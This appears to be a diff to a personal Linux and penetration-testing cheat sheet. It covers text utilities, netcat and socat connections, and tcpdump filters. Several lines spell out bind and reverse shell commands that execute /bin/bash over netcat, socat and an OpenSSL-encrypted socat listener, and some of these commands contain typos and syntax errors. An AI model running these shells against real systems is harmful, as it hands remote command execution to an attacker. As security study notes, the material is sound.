@@ -43,7 +43,7 @@ tail file						# last 10 by defult
 cut -d " " -f 2 file            # -d for delimeter '\t' by defult -f for field -b for byte
 
 # awk options 'selection _criteria {action }' input-file > output-file
-cut -d ":" file |awk {print $1,$2} # = cut -d ":" -f 1,2
+cut -d ":" -f 1,2 file == cat file |awk -F":" {print $1,$2} 
 
 # comparing files
 comm file1 file2
@@ -90,3 +90,33 @@ nc -nlvp 4444 > new 				#receiving data
 nc -nlvp 4444 -e /bin/bash 		#-e option works on kali nc
 # Reverse Shell Scenario
 nc -vnp 192.168.1.3 4444 -e /bin/bash
+
+# socat more powerfull 
+socat - TCP4:192.168.1.3:4444 	#to connect
+socat TCP4-LISTEN:4444 STDOUT	#to server listen
+#bind and reverse shell 
+socat TCP4-LISTEN:4444 STDOUT, fork EXEC:/bin/bash
+socat - TCP4:192.168.1.3:4444, fork EXEC:/bin/bash
+#openssl "secure sokit lyer" for encrypted connection
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt 		#generate a cetificate for connection
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+socat OPENSSL-LISTEN:5555,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+...
+socat - OPENSSL:192.168.1.5:5555,verify=0 z
+
+#wiresharck and tcpdump
+tcpdump -n -r tcp.pcapng
+.....filters......
+src host 192.168.1.5
+dst host 192.168.1.6
+port 4444
+'tcp[13]= 24'       	#packet flags 00011000=24 ,byte 13 in packet headder
+.....flags.......
+-x 							# display all packet in hex
+-s 1500						# snap length ,1500 byte,if 0 means show all packet
+-w file  					# to write in file
+-r file 					# to read tcpdump data
+-A 							#aggrissive
+
+
+
